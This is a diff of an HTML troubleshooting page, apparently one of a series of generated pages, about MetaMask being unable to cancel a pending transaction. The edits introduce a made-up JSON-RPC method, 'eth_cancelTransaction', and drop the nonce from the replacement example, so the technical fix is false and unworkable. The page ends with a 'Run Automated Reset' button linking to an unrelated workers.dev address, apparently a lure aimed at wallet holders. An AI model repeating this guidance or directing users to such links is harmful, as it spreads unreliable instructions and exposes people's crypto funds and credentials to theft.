@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Unable To Cancel Pending Transaction Due – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #1a1a24;
+        font-family: system-ui;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -42,42 +42,42 @@
 <h1>Metamask Extension Bug Unable To Cancel Pending Transaction Due</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users are unable to cancel pending transactions using the Metamask extension, resulting in an error message indicating that there is not enough gas to perform the cancellation.</li>
+<li>Users are unable to cancel pending transactions using the Metamask extension, resulting in a "not enough gas" error message. The transaction remains in a pending state, and attempts to cancel or speed up the transaction are unsuccessful.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs when the pending transaction's gas price is higher than the current network gas price, causing the cancellation transaction to require more gas than is available, thus failing due to insufficient gas.</li>
+<li>The error occurs due to a bug in the Metamask extension that prevents it from properly handling gas management for pending transactions. This can lead to the extension being unable to allocate sufficient gas to cancel the pending transaction.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit for the cancellation transaction to ensure it has enough gas to override the pending transaction.</li>
-<li>Use a higher gas price to expedite the cancellation transaction and increase its priority in the network.</li>
-<li>Manually construct and send a replacement transaction with a higher gas price and sufficient gas to cancel the pending transaction, as shown in the following JSON-RPC example:</li>
+<li>To resolve the issue, users can try the following manual overrides:</li>
+<li>Increase the gas limit manually using the Metamask interface</li>
+<li>Use a higher gas price to prioritize the cancellation transaction</li>
+<li>Utilize the following JSON-RPC method to cancel the pending transaction:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_sendTransaction&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_cancelTransaction&quot;</span><span class="p">,</span>
 <span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
 <span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...your_address...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...user_address...&quot;</span><span class="p">,</span>
 <span class="w">      </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...contract_address...&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...gas_amount...&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...gas_price...&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;nonce&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...nonce...&quot;</span>
+<span class="w">      </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...gas_limit...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...gas_price...&quot;</span>
 <span class="w">    </span><span class="p">}</span>
 <span class="w">  </span><span class="p">],</span>
 <span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced transaction management and debugging capabilities. </p>
+<p>Consider using an external console to execute the JSON-RPC method for more flexibility.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Sufficient ETH balance to cover transaction costs</li>
-<li>Basic understanding of Ethereum transaction mechanics</li>
+<li>Sufficient ETH balance to cover transaction fees</li>
+<li>Basic understanding of JSON-RPC methods and gas management in Ethereum transactions</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">TRON Post-Quantum Signature Migration Error</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">Java Tron Feature Tron Post Quantum Signature Migration</a></li><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
